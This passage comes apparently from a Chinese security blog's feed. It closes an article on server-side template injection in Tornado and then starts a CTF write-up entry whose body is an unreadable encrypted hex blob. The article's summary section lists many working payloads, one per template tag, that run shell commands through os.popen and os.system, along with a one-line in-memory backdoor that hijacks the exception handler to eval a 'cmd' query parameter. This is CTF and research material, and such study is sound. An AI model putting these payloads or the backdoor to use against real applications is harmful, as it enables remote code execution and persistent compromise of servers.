<code>request.connection.write</code>，也就是上面我们提到过一个非常底层的传输数据的函数，所以用这个就可以解决这个问题。把 <code>x.write</code> 换成 <code>x.request.connection.write</code>，再附带一些额外的数据即可实现一个比较完美的回显效果：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/6496ee47-9183-4435-ab70-2dfe5ce10fdd.png!blog" /></p><p>这样后门会更加稳定。</p><p>当然我们也可以直接把异常处理的函数覆盖掉，这个时候就可以愉快地使用 <code>write</code> 了，并且利用的时候只需要指定 cmd 参数就行：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.__class__._handle_request_exception=<span class="hljs-keyword">lambda</span> x,y:[x.write((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(x.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>)))).encode()),x.finish()][<span class="hljs-number">0</span>]%&#125;<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/c4ebcbb9-e41b-4f64-9487-52e8bcf8d59a.png!blog" /></p><p>注意，上面这个技巧在 <code>500</code> 时会生效，但是 <code>404</code> 的时候是不会生效的，事实上只要是 <code>HTTPError()</code> 的错误码都没法完美地实现内存马。</p><h2 id="总结">总结</h2><p>已知 payload，举一反三哈：</p><blockquote><p><code>&#123;&#123; *expr* &#125;&#125;</code></p></blockquote><p>可执行任意 python 语句，不啰嗦了</p><blockquote><p><code>&#123;% raw *expr* %&#125;</code></p></blockquote><p>可执行任意 python 语句，不啰嗦了</p><blockquote><p><code>&#123;% apply *function* %&#125;...&#123;% end %&#125;</code></p></blockquote><p>上面说过了</p><blockquote><p><code>&#123;% set *x* = *y* %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% set _tt_buffer = [__import__("os").popen("id").read().encode()] %&#125;</code>。覆盖变量的姿势上面都说了很多了</li><li><code>&#123;% set a = 1\n    return __import__("os").popen("id").read() %&#125;</code></li><li><code>&#123;% set return __import__("os").popen("id").read()%&#125;</code></li></ol><blockquote><p><code>&#123;% autoescape %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% autoescape __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;</code></li><li><code>&#123;% autoescape __import__("os").system("id") %&#125;&#123;&#123;0&#125;&#125;</code></li><li><code>&#123;% autoescape (lambda x: __import__("os").popen("id").read()) %&#125;&#123;&#123;0&#125;&#125;</code></li><li><code>&#123;% autoescape (lambda: __import__("os").popen("id").read())()) # %&#125;&#123;&#123;0&#125;&#125;</code></li><li><code>&#123;% autoescape (lambda: __import__("os").popen("id").read())())\n    ( %&#125;&#123;&#123;0&#125;&#125;</code></li></ol><blockquote><p><code>&#123;% for *var* in *expr* %&#125;...&#123;% end %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% for i in [__import__("os").system("id")] %&#125;&#123;% end %&#125;</code></li><li><code>&#123;% for i in __import__("os").popen("id").read() %&#125;&#123;&#123;i&#125;&#125;&#123;% end %&#125;</code></li><li><code>&#123;% for i in [1]: _tt_buffer = [i.encode() for i in __import__("os").popen("id")]\n    for i in []%&#125;&#123;% end %&#125;</code></li><li><code>&#123;% for i in [1]: return __import__("os").popen("id").read()\n    for i in []%&#125;&#123;% end %&#125;</code></li></ol><blockquote><p><code>&#123;% from *x* import *y* %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% from os import popen %&#125;&#123;&#123; popen("id").read() &#125;&#125;</code></li><li><code>&#123;% from os import popen\n    return popen("id").read() %&#125;</code></li></ol><blockquote><p><code>&#123;% if *condition* %&#125;...&#123;% end %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% if __import__("os").system("id") %&#125;1&#123;% end %&#125;</code></li><li><code>&#123;% if 1: return __import__("os").popen("id").read()\n    if 1:# %&#125;1&#123;% end %&#125;</code></li></ol><blockquote><p><code>&#123;% import *module* %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% import os %&#125;&#123;&#123;os.popen("id").read()&#125;&#125;</code></li><li><code>&#123;% import os\n    return os.popen("id").read()%&#125;</code></li></ol><blockquote><p><code>&#123;% try %&#125;...&#123;% except %&#125;...&#123;% end %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% try : \n        return __import__("os").popen("id").read() #%&#125;&#123;%except%&#125;&#123;%end%&#125;</code></li><li><code>&#123;% try : \n        1/0 # %&#125;&#123;%except :\n        return __import__("os").popen("id").read()#%&#125;&#123;%end%&#125;</code></li></ol><blockquote><p><code>&#123;% while *condition* %&#125;... &#123;% end %&#125;</code></p></blockquote><ol type="1"><li><code>&#123;% while __import__("os").system("id") %&#125;&#123;%end%&#125;</code></li><li><code>&#123;% while 1: return __import__("os").popen("id").read() #\n    while 1\n%&#125;&#123;%end%&#125;</code></li></ol><blockquote><p><code>&#123;% whitespace *mode* %&#125;</code></p></blockquote><p>暂无发现可利用的 payload</p><blockquote><p><code>&#123;% extends *filename* %&#125;</code></p></blockquote><p>上面说过了</p><blockquote><p><code>&#123;% include *filename* %&#125;</code></p></blockquote><p>上面说过了</p><blockquote><p><code>&#123;% module *expr* %&#125;</code></p></blockquote><p>理论上可以利用，但是需要的条件比较苛刻。</p><p>在实例化 <code>tornado.web.Application</code> 的时候就需要传入 <code>ui_modules</code> 配置。如果 <code>ui_modules</code> 的文件（<code>.py</code>）可控，那么可以直接执行任意 Python 代码。</p><blockquote><p><code>&#123;% block *name* %&#125;...&#123;% end %&#125;</code></p></blockquote><p>暂无发现可利用的 payload</p><h2 id="最后">最后</h2><p>其实越是支持 python 语法的模板，攻击姿势就越多。因为 python 实在是太灵活了。</p><p>本文主要受前段虎符杯决赛的 python web 启发，那道题就是 Tornado 的 SSTI。由于这道题的过滤非常严格（我有理由怀疑这个过滤条件是网上搜了好多拼在一起的。。）。虽然最后题目是通过 <code>str(request)</code> 切片的方式做出来了，但是我还是想不用其他旁路的手段，来挑战一下过滤条件，过滤条件经过调整，如下：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/34a1cf65-ce14-433a-937f-4ae50941883a.png!blog" /></p><p>解释一下：构造出一个 CMD，这个 CMD 经过这个 <code>all</code> 的计算后结果必须为 <code>True</code>，且 <code>eval(CMD)</code> 需要可以在 os shell 里执行 <code>id</code>（其实就是实现 RCE 啦）。</p><p><strong>巧合的是，经过一周左右断断续续的尝试，正好是在 8.4 七夕的晚上成功解出了这道自己对自己发出的挑战。看着屏幕上跳出 RCE 的结果，我想这真是一种别样的浪漫。</strong></p><p>我准备把这个挑战当做 OrangeKiller CTF 第 3 期的一道题。</p><p>好，我们下期见！</p><br><p style="text-align: center;"><font size="2px" color="gray">看图写话：<br>🦅 ⬇️ ✈️ = ？<br>🌪 💥 🅿️ = ？<br>🐯 🐑 🐑 = ？</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来以为 Flask + mako 够用了。最近老遇到需要用到 Tornado 知识点的地方。好好好，我学，我学还不行吗？&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
    <category term="SSTI" scheme="https://www.tr0y.wang/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>OrangeKiller CTF 第 2 期题解</title>
    <link href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/"/>
    <id>https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/</id>
    <published>2022-06-27T19:00:01.000Z</published>
    <updated>2023-05-04T09:44:57.348Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="我草？黑客！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="84d884560fdb28c45c377220d4ef9c8eedf52c5fe60906888ed8600739ba6f43">ac6310f446d9391b8f10c8aff16932fe1938f1e7d48cf7ba0d452c5c9a5ea436e66b75ae934d6c594f9b1e388bfc271117c83c3d01a8649a977788e039d002c9272ecb5dfd880c21109197e775e2b1193de87c833f7c581c6d78a713dcb7e74e603c4e7a6fa3d23c1a1f9df67aa2bebc28335fed61ecf39370af3a9d27d4143ce729942675aade6f1029870e97786429930d693284df590256360492a56376c94c572f526d23342af9b9e6ef5740807846b8c87a37f7d7f6d2242125527b95fde9691ac1836b7c553e4d9925beda582cf52c9db09a6532fbee2576b1553901aa30804dd75efaef442bb82b31a5d0322448aad7caf2ad020463f9a5488e7824c521f3044afbfa2e3b2891251ec89a03aae562e9071c909a70d14ee92eab7377bfc0b6f0cf22c7761f9b8d29e9b650a98e6022e023dd734933e5e2f5516abde04c25ac0962afa060754cd43d978a1cfe5d360c8dc8c59c76976810a301e99125deb9d17c9b7504f112f0a576223773efe198c8b8a851525e9de7957c78497bfd45b9b8140f08a94995d0986ade8844eda75d9e2ce4953cbaf6578908677c2d712262261c504a9e960e4b04359b405a354a9aad0000fcd09021158acb9fb69dd7e393cd5ceed01af0a8e512a41a95b90e0fb91bdce7117685b69a5d64812d12e7ba5d1ca6f98c1b8936a324284dd23ad437c8ba640fda49b702f15eb0752004cdd04c4a049d51d3f1f7bffd36469b00827b4d789ad137ed2ab4ff32071ab5d293f0d90a0bbbd60e5658987aed1ef035c6e9c6f05812af0c525c643e509888571186fab4b89b5580f501a0e2f9ac9a76246e738aadcba5eadf009f101e65b02cc0fe2cb30ee1d4f67ce78cfc27e9b436b1441f2acfdcf4e688d3c91d74b876fc8885c37dd6123e1a107bfa2e5ac62b25dd87d28b58abefa7cd2a9ed4d928cc2efa4c89a3c4a715733e673cd483ede3a0af4ba7001bea1a5f077f7ad1a592b3ecbff71766773223c9211b57474ec856e3652abc53daaeca07952309d202c5ce25dedd980e4f14b370f25aedf883400777ff9cf85ed5a5314dbb288d9267f9cfa6c55d302d83c58ed2b601af31fbd590c6be5c5d8ea60f7a0a4a3469db3d6df68cd41557aab5b940476b41c58954d408bd35cd9b34aa92c058fbc84332b556b742292edcdf6c71a6c0a2e232d6c356ca9e28195fb44aa4a7163f5c35bd90dc739724c39c741a62649a21552a3ea5723ccd6b4fdac8ecf2f4d8cc353bbc2fa88293f5f679845dae8c83b444508ef7243a33a602c039169edf78eca4a3865cc8e1100a3a4601d7694d71cb7b5b8adc9e19458ff7abf98c6c02800e7e70ac5c6f5f016e4e3d93507d7be11ce4730996e8f8a928a4186fe9ddbe2438d2a776e08de6eb739e9fc1473b0d1b729798e4dd0de4433a72662898a09becc3a3d70a1fbde70f3f537eb208fa4d63bb5cebf7f24c68f5a4e3c56c88bad2fcc44ea5767dfa3682249fa0eb9f6fc2e9b2b825363eb49976b3a71b9df6bf11bf513eabea9453af7f0a55395cdedf9dcb6e2280f96fffa894457a3445de50347ef3a5845fa5b5fcf5736332cb9e3c7f8c7aea8f3405e01d5aac73607a644d8b61ed78f75b2b956a6b016cae1d96ad21f0e051f109296cd9d924dd4dd0e7c9d5f5fcc8c81316f18f5d2ca54214d9d13cb6f7a105c4e6dab59f2feab813c3028693fd0dd3589fac22cfc35941147498394e5590eef2a8573345148c0899b4fff21a6ab6cac2b89df2e84d7683e0d3365b88c9455dace397b7f3d5ba49cbe9783341103abf5e9ea0c559eabdc8e597e0d10ef5fcbb1e281389dd447d36d74a338db4f3057b9452964b858dc892a5ce624167498f7544a8917604aeb2970b2db97b42c19280ba94b9f471645c0d5fc78381f7c0354c244a71c65257efdf68de8a91ec8bb5362064b3007c51857e53fed9f56330a24382c1f775427936e7821fe2f62911762335091dab52b60e561eff8ee53bf9bab0cff52a36df5d8002111527af7e76ee32bed6c0b228a5c97db8dd2a5395bb94c6db28e8aa1dcb916daf71d37c0b93fcdc4658f7e14e4a1998ac90c8d11fcfda872f074b1ed6eefda12932b95842a73ac36e9dc727a5cf494e140c856a2a09dc81d3011da9718bea000b0808c862859288b4d3aa00bfb9d617409b854cbb4d4c0cfebb681bd348e47169c5b6d234ce61a1f7da1342f8e06258bde792457a0c2c5e62c6f56fdfd244229ce841380e0463ed3c8f2b4b60fe692bcab5cfed135313c64833fe473fece4802bc441f7cc3a3d57673e79ff826d9eb38bec4e5968b70fdcb7643fbdc3703a1e230ec3c93295aaf42a70a9da0627247f83a038910c28ecaf3c220daca52b2ed3018a5b8034dee49f66e8603214fc72f69fe6f49d0c7f22f984ecd2501bb8ee3ab8deb2482387e5e046733577c8d4e3441da7877b10779640d4ec8f69f61bb6552431c0847d250fe470b193ae31f9d16b69daf7592495c2aa79ff7e70bec184d308d566a46a3cade0bf6c6d50d8a00a692fc170739bcee0e3057e329452b4c37c34d0123c61a2bdd70c69336f6d0b70082757b3aed5ff32d515a9abbdeb6442a3422acc35bf544727f1fb6f36c377115e486ee65c92a786bc6077d30696d197eb80e4dc82f7baef0a95053414769020be7fb010454a419c443d6904ffa3288839440ae4b0d05e6f25036fd56eb56ae865bb58b221d2834f3a651ed63391ea4116d549bf9e8e8f9c81ea969d4ab02082ea42436b368896c02f7f126522f06851cc05e43178a3149c37ccc7b34d2e0b0bc929200d211c732968fbc15b99d091d94d49edd47809133abda3eba4cd3989b82d4626a747e6901bbd0b54492f7f5fd6733ddd49596055aa654d33b2f72a6500aae1d2e5b4bded6ea7a5d3f65ef792291192a32881fc30fd85b9fd1213a8a08a00c604566e9a250fb9f3622bf33907995e9ac4dcc78d29672187a33c4db8c26aeffdd22625240eeb5ee7f6548d61fa996103ed9043cda1c4d6e69a0541a87c8a54998cee8fcd92e6f37e83c7fbff3a5472c3a919c7a6055ca5cca02ac7b842b37a3b0f4acbf8d87b7ef35ac266c483e0b027291ee46650db112566f98f1530fca7723bdb9fd44c7c708d4b9cd8e84b10c8eff8681fd9c1792cb97076a418c48b086a14dd2197eafae911423ef76733350ce241c2549ad2c88fc64b6365b6b0c6ac163f22565263199dcd7538e31ab893d246093504bebf2c2d03563cb8dc64dfc98c9d33b46e13a96f828ee21d5000145a1407b0d13ca84ba6073733b9599ff16ffc08cc0201cbb9659afad3317f0f42a5e596b62225f2513bb7588adb51852c255a5056e253d8fd87884b9bb1b10ed19e4f23125145a6f9f26e2f446e6ab741674aa0f4399dda993c86ecf0064fce97f8310a722906f24ca033fb8b49ad519d8729f05cab3be704bc32c283e9d024204a2d16fe577aeac9ff8880ebc1879e02035858ff395a9b968cbd125fb607d1caf747ca164ad459246be6549e9ecfed12bd0bf6669db04640ca7d32abe22e80726e2725fcc15fdfee68a92751c49401d2e96efd8a07ab2ae6a44bf8778f1139d489346f464e8080aa39c193d0b28e49732448cf8eb314ace76d441e306014af701eadc63acaffbedf3baf31d5a39049e1c68ea141167592c889f4a0b8e6a8eacb77f51e625384bf3018ec2a6b66717388810edc660e494a8292e9202cc5467fc4f8a1a4ff7ad2f5ec9586e2c4ab102981ba010be18867126581a8b33cb71a3c257bef42458fd8d1fc261f702771880180e2b1c18186aa537a734b9680d90f44512fcf7442da855310abada7f821004f2988c384cb75609078c7ce9a493cbe90e10eb00fbec4a26ceb6f9731e9611656d57c93c7e81dc52a52a4e1721f6d0f6290157ef7a2ad47fc222fecb89dca63f0a40017b7e2a5001034fb282cade3dda63c25fcf8ebfdc741d5ca9da3a6a50fd7e3894effd4a4c474ec33ae8e5c261950f46876a228bf72d659e1e4cae49ba6a9e1925ded5779620623d5755021bd73507a18ff059f55b47b2c6141a1ef999b30d3cca8ca8435176a7562f000349b84901cddffabd6b10674c7b133b59b314f62972076874d20858d7495e479b56fdb69d06d2013117d26a1293fade56c2fd4a74cad17e6e891670e0811b7ddf1160f919465a0d2a0256259f8ad7feafd06df5938ffd9eae94cad07c67e337f5dfc9eb887caabb07e31ecd47a95e0f0f11b62f13427581f62b6a02d533984b96e57bd1cb3694ec7bb44d1dacb46b20d6d508259bf60b3d241a25d1a118c6ce76d9c8b73e9ab534435381ed7663a06c6202a36a3e37233fcc254f5b53658a3531ed6030984b8c764cacfa9ed7827ab404902e98145e148eab3bdb7bfdbbac328d204643371b65656df7656dc4580550e7261b532937abf05606685b4877a92fc3735bc56ecdfabe1950db217fe7944bf268c4b9d739ef12fa9d9bd83f7aba6cd7bd5505a96aecf29bddf3fe219d39b1e7918fed10153aa7524214cc5824f8caf22ddc6eadb3bbea68bf36cabf8c659c4c2fd5e724bf45785c01b09aca03961e3319ff5537f3a48ad7be1c55fa3f566115756715abbc7ec9a4908ae5c97373df5dce0372dd3864e05c4d2f56fb50e9a35a83682a6eba5766f6eb9ab3ea8d3bdff88b0153a43153f804b3db297d8520ce335ea4505bf720456d43c79aab7b3b00e248f6103b17cf768829de77a0710abf3ebb622d8a549ae8cc97835def55c058c0e03eeb765c03e1dbf6eaab7075d1855c0fd918a1651a11952055e62a2bc7ce2c045b41b31d0f9505b34ba433ed502463e7fc127f6b675b1a10ec2415e91857bdf45aaa57b9aa75afc2c94f4d47d344321f4c9f535f225534ac18a59c21f8474084b3b361a24b1ffa324478c92e92e5c4ea31aeb8de2a0a88706f7bde4845257d672a4969184ac65e5289c925e60dd53435cca7be9fd8a63df9e8d47b11f54b675904a22dfc95f63295a66f46a4bc67c006bec9ee44534c78acc86d2a90946cdbcd7cc524eea3c7a97c79fc635dfe5f594bc838ca57920f25b6ade8666746e7a5872974c6605d67d0a056f820a255a4fb779d9a1063aee1f5c2fe7fbe2b55596165bfc9a6173e864285e905a5e66416cd5b95f26c9b8cbf0cf1ccea4f8ee3d56776b5e7ccd2f7c489347074faa20168388741f2fa41b30a7265358b02df51a15988b6d208c3547ab047ccd77cd6d6420622aa817aa2263f2efe745eaa7246ac5ecb5391e146881bb7abce52bc4d5238415981800e9e5a130e5eaccf522460bf06c3e97683b27e48600a05a709987f19909c6d315c88bac7be9f293448426f8b40c6265fd3f7f51a6f5d5c1569e1d68bd828b2cb59e55a754029118520f3e51d67ee657c232b60591e5bd5191e444316d473022d802cd95f5cc0b569dc45f719614c91ece6036a1abcf7906d0b54e9ac4c9bad79ddf2de731e6f3fdf384b8f172f98e3461ebe54c0c43e2620ac82b05a5ad2e958b9aea8ddef004cdd6fd3550826903797ba60de7bedd7e8f9672a9de0c5f3f77f1a36235c047f5ee71a81b19324ccc573291e7282d8e42d2c964b16657ca4f7bb8085195fed01bf871e468025aa8305908e6792b37c9bdb99887a7885c8c8595645d009c14669a5f2c98039cc8c8f3a7d55666e2e666e178fcccd58141e8163a05c2aff8a548fa059f4f0e13285bc69d9942a378173239cea00913c5b2bac5a9881cff9a74af2b5ef095fc8cc071506a5baf740d43c7d1128d1da626c60777b5d30e5de26841bb6c46babcec26748b385c5943c23a7c6a0fbd02d50052a6d7da3bee1e1548b5c6eedd8a69e6f8915ecbab2e68c18d2a84dbf0cb162d39ba415e00668f7053bc9de87149ff3b5533a8bdcf72a370a479df533e8e1b7bb233fa0a4c858fbc2e6e0e88047dc6525e34a83b0a5bd38e680816e6a27d80f077095bb65120f4031dc38a7e10f87af190559623e40385cdf0376a4094715a2227a16acef914916183013314b6ccb4c5dc4b3d81a2a66033d6092c0a644db51890fb72833d79e9ca490f3a1c22041da3f8d8641affcf000301a740ae6330841ecf71ffa9e457f7efdfd186be0604ba7db80bee77ab34c7a52a1f06af47e9189799ef30dd6e9d466df77a5e747eb00606c2c1e9d9535af8e3f08c42d5a1e1d719381cd040843d6935ac8f304119496ff8340556d4e1c2edddab0308e767df82bdcc485ca0df0602bd0f009115a9ce5e689896384615ff71c3c9b832044a0bb21ab771757c21251da1f008dbf442453f8db6731bfa26dc830ea84f2d2a5aa54aa1d5cc94d008c7bbcdefbdc39bef3f4fa77f17a710fe12a91cc8cedb1f8b621cc0e29977e95615a21ff637f2a37ef6bdb1cf1cdef05dca88ad3fb71c69910e79db2edfea9881d0b1bc685ab34d7712b0ed64b3fe89e055e5f789b295f3c0c0cc2d70260fb5dbcd106ac9f3d49b4b387a3271285de0b5da567386b879b6f3a5e6663ff9507c89828084b64f0d17b94d4400177cbadc5af3c3d17984cab5b5d6135a3e8de5abec42c34e69fd89856cc4f799bf0f77773ad9010639cc6f20796998ea0b340fbe77adbc308e4838bf8e64a9650dcb18de84765da07f011eb9eb0e388ce148c7bdbdf49733e0786bfa69eceb818709105bb579340f4e6637963eab9ae787b7cdcc5cfcb0113b9fd4a340295e51f5ad956141f65be3d648e0fd6a1ed8009e0c64ed63b5ce0af7a18bf1bd1f4fe02991e8ae15e259baa69fb9435507055114441740ffe14dfe61108ba3b0ad8e626ce858629c679186506588cb66922119c528e800573ed1d654fa294e36307f30cf2fdfe077db164ec346b39e376ed8e981cbe5bae24dd6b729942a2f07dea4fc634306c038c74afdbe22f13e18a721203e1438d2e9940bea2ef516a100c54621d1e7407f23167cd735150b2b2213f786b9024462316fea8bbb60a75deebf1c13b12dc39c7695137cb002ac8a42b1a3211bb8e52244b84d082953be2704d3e45f2d96f80e78d5e874df5f061b566f1ad14d2ee7a9ec97d8030d4c77897e763a9377788383a9105dae427f9206862c4ebca64d7c094fab60bc2a456ba62c5f0599a81f5cf6490bd0db77f9d1f33f98287eab1d7904fa0b88cba7715a517d840d14cdc2d4b93b98ba57ecf6a5541556cddcf0709d173185128c3f5373944881362b403b2edf2d54cde63992d8d4c5fde67accc0511e94289694c24e3b6f6152d8df179b8b71d1e171aa620591a50d63b5fcf55ce6682cbf09d5d64f41d9d2bf107ed99f1e3a86c9ff0a8d823d2513a082ce704532fed42f4674e5a0134ad594e6d6c9918e22e79bdc9e95a15399cd5157cd9e598e3349333debf98df08ea34a167224ec1b80f327b42b8cfa09db70aa5cfbb3c9a49be7012686c16cabcd78f2e5aac8c7e1274b2cd4282ec8cc936383acaf6fbd7d0cfa1cbc67c21c06bf2b9cbf36267603eb9b427f92be119d2a4c589094f838d01171e89204f9bb4344846fb41cc66613fec702ecb8e5762dd54c7121d581d6f5d26b1b8d967a1cc9159080e9caa86a79f2220e12fe8f5cd4f2789d2a4aa7117d734e8b4fce5e2f428ca218173f98a8382f3707d1fe238b59bc847b5109fae0bacb5ea3d521beedc84a981259996bd2f5f278af92b902d2b559be862bfd8c1886c8225c4204354e3b4fe38457e329e93d49b822b42dfbff7452be6e3a2c634f5e3e5686d5a41e4d8f955afd98ef05221bfb6615058f5d490350d8feffe35e5c054ee4c0ad93276d21d1a2cefe70cd276ec231a35b0b9250403dbe39c4f758988639dd65f642beaeb360d78bfc3e3d035166446945fc6ce5ebf273ded8c6b007dd663438a2aafbd74f8307c293bab23b702f9ca6ccae46ab08d1dfff883683b6a014aca90837f03cd5839ca864791de460a0d0bd9e16274c49029fb32324b304899f00f96936a00666a6aa773bff29f382010e553f47ce9513521f16232ebf7aa3dd6978c82cd85adc20770fd13ee6bd358c9d515cb31c83000c6cab44ad6498c1deecf039f607a0d0e48edc0354b36d1e8d854eb83db2230ebb6d5df5eaa659577cfb07624b9b3e4b0e98b6a280e36f521b6326fdbb8ade658e1455b692e52f48aa317d92cb335df135ac91f0bc87492833ffd717597eeea051c5f917a40789f63c2cc7c85620d3d07ac8d02ddde92f7c7876426f00f3fa9faa9ba7f8238cf645a58d6eb6f1d9a6f6e14f1a2cff2dd453e638d549da7544a73ad2bea47c635e152cb43233cede14c89e67b482691c470196a72a301652c928eaaabee9d50ded0dde0931f18e76cc697f5bb2a02623b0398c4fe0c66e23e0d77814989af34052b6ca76335cf2f40640333faac306437e82d03bab5ed14d42889b9b2b48a4f6ca9268744c480dbcda27ec1e028cb00fab7e4b182f74ef998406a5b639d713762e9b51286c749ffafc1c37d55d8cd675682f382834d392886f97a09590ed1356bc84f096da25de8b5b9435cf09f6620cc654ec3029a3a9f0d0399fe89159acaece7b3e68735faf51f7a9881993c0b345af9c2b3d5596d7bbc87d6d98a7c72a52471c36d31ac026987b67d1c3e168ea4dfc69657f378dbc2f218c4ec34a25fb9b70640b39b5809db0a6ba24056a3d130aa71806acc1536883227dde6d761104f7ea969f58de8479e35b3804639d367a69449cad5d52a7e685617ae6acd4cab2aefc5d84166fa5eda86da698ab866818ab235f3a5b62e1f9f487f1ed0037b3f4667052d64267b1225bcc21aba8b5e2a2eae41410247ab95a0842954d47fb0e82774cdf65fa5ff52b6b501bc3052960527766c4a4b44bd039101733051e15ad3bab5521df2bf520f3ab82c13adfe72dad6b6d0dfcfe097c675e385306aab9888f3721d78e72e29e6e2030c889d31867edde15cf0445de94dd979999720c7a0ca8755e3a6655e8457eb31a056c1a9c00998c9f2b84c414cdcb7a99b585e9c8b41fe4798542b6d088076a25495e33d45eb279e48d3d550f8e96081285d710575e8101fd6efbe18808bf5c7fa61ce3871da40856ef3e511942f2382f2ed290eec1c472a98673246d51491a35ee96f4df4380c955213ffbce768b61777fe55d86df0b4b6de8754c13037ab168718de5d37c9c70819851e6d06aa941d405059de40d5931d965fb2b761f01c038615db90e84306ebc1eac13bea9f9ea611798f5e577a8613541e9943563ea98c467ba8f79c5f7b36420e28ba2b91a89ca78d0e451234ebb53a02aca36b6df3e6758b27ad2fdc11a4b286e5a0aa0617b20159aba02ce3f71485c010c39a8dc8bed61c23b9e8e386a92ac481346a5b09e4a94ec86bec08b774dc1760bf150ecaa307d5faa9c46867f7c4f9e0e17a5595f5bdbff4ba04f1e284634a785ec30864c2a84cd07ae73033112ff7d37cdd161cb85597c0e53ce6f1d04921e87962bec2a05c3a8963afa90e2999d79f14ea15a7fed910d476e1cbbf1ad7fe74fa04a1e4be3a2da43a1f3d0a8dda503069b0ac5d8a8bfd8db8bba68f79b75e02179ee51139ee56aedc496a2096442995c4358d3839d252212e238b93bab331442eefdda45dac4c2fcd339897bce9470fc898e8343f1ad1fa5dcd8a3d16f371acb9bb458b72138c6b0b6b440eebd54352478733631f4c69d437a6159266e2852e32c5936472ad2f9e3f8d8216494b6cb0c763dcb26fbef64225f22bd7a95ebdb66c5d1205172b9f4cc719f089a7a6d2f5c27ef739004b72becb851ae059ec5853192970e7850faa6c3e08d5db71406fe195b56d98e7beea84c1fb176db48bc86a5559be6f3bb14827a1c2e3a03aae814efaa2f3bcc0165ffd6eb29c778a0c4a27a7500de860f04d4f4cdfb714b2939accd20d98f532278fca4df2cead7a86d5a1c77e977b63308a9a5fd88d93631ffccab4765939b4ae8085832e58f123960f46acf2e03d8c454fe9a38d1a141981ff56b1685ebd1bc2435d2d3e125fadbe32e93c93898a1d33be96a9fef38f2c4e6b0fd956812611b1c7662e2b6b465855021fe0f6d21e2b6cdce3fac5c24b02163926710976b90a4e30d291fddf78ab4842134a8dd8b844eda56bc3a64771397641e50b59844b3bc22881fddab1e69c1ceccb2d852746399935103ddf3beb0674bffa6e0742dc635c440a694e00f9da622dfc129711f762a4171e2d12d57b66b8f95a9b093f7a2af0a1648ef37995830e208e6b4c9c3b4b493af212f3868f2c66b6f32a4ba142415e1b872a5c0dc184f0e15f8558aeae18f67b784bdc7a99f071e2ed75994c35eda664db671a55cf24cf9081573e8a30091a874d4b9157df89283c89da199b281006cdda9eb8b73d9656b77d2fc577d0fd417a73a8237df87959900d6fdee390f77e15a1a21f7a840f2222e049e1b8013511eb6c0f293ae55209a0e8c67b72b399ff5d2603a6eb2836a0e984d9fbe7729f664e0a96fafb38cb2a9a047a8698571834a1dbb417ea75290e20ec757bfd7f5a7757fb5693b1084450b1378d87b1ee6290aae83d519144b509cab6d55aef78e8d1aeb92499a3a4d1d3ddf5c063eed33a633f87ed27d735e09a352235eb2d8f29a77f123e60646fb2d94f63ed7a847f25e7de85d7b9ef759678e0552e8795955b34c104ca3bcdbbd94dc86f2af4cca763349300fdd07fcbd6dc34afc3dc1748bc3835630f90c17064dee7e2ceb28759a340c5c7c1d588734d3dfd0fecdfc704d0bac2ae4f17ffbf896c993155baa3f975b2006a92b10b6428928475fa0da9a1066768de7964168f73b7ae1c5f582b02e1c3c9b7b9ec877d4ee77b8501a7818ec96f99da568c3a94d1e8061a503bf3dae684b9e35da3be4211272e8d4222f81f46b207f6113d895a5ce2d29487081953c61bd9bbd1c1dcbbdc67bdfca92fe0cae74df2cb0f574a250d58bc0dd6141664605b37cdcec9b620acf57c1af120b52acfb2839f3273535a85f150e5676ae7145b87b72b5d72f47c465b3b883fccd1d14be9f4b9717c96df0ea0ceee84e0fa6505cf1a81c81dc6411bf69c0f92452ef89c2ea9a62978509122d22c2677600723a136cde375c1dae550c8273cedd8d2624e0d87229bfbbb5338e432bb0dd24ed2c5703b9487f6b002621f5314421eaa1d019010a059729f15f6f3ed5ea46b596c44e8969367820a7c0dd5e81cb582c683b7aad6efb429f76c53112cf77244f23e659c45f743ab66f538312e7d27af4a326ba114a4d33c1bbe133c086d91fe6a91912f93a4eb14bcdc11c66ee66dd1639d35c3f68ae08870eafeb1be944fc374a37c3dddbf07af8f92a023e4a1746a4f3cb1335de53e0f5e5883926b83b017650379bd3a073f7bc42a257d46fbd320af0a8d9e3c63e29a25f059c0a2b77663901d2da297fb62829ed3f0e15cc520e90fe7816b8a34675fd41392bafc10e3adef09bdbf6393e1516ef0034432e183430cc34f8baa24eec4c37af8014bef26c63f4a8cf9a9a6b3094a9a047ebe2b688e7715293d02ca853286997a257d3962a332e1ad889805c01be8cc8b8c5e88b338ed22a035c90aec04c1f13fffce94d678aae11d4efe4ff9436918adec97fcf46ca8cb006854c0cf0e1f5f7f5983301148ba4f24e748cce7cc54616990b8df749ef27aa556c47fbf4b25b109e24daec132689b76742d3d89642f26d064ba488192c43a70ef9e876137419efe245b1efb50b480c2